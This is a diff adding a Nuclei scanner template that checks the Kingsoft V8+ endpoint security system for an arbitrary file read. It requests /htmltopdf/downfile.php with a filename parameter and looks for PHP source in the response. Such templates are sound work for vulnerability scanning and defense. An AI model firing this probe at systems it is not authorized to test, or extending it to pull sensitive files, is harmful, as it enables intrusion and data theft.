@@ -1,0 +1,24 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: Kingsoft-v8-fileRead
+
+info:
+  name: 金山V8+终端安全系统任意文件读取
+  author: Str1am
+  severity: high
+  tags: Kingsoft,fileRead
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/htmltopdf/downfile.php?filename=downfile.php"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "$filename"
+        part: body
+        condition: and
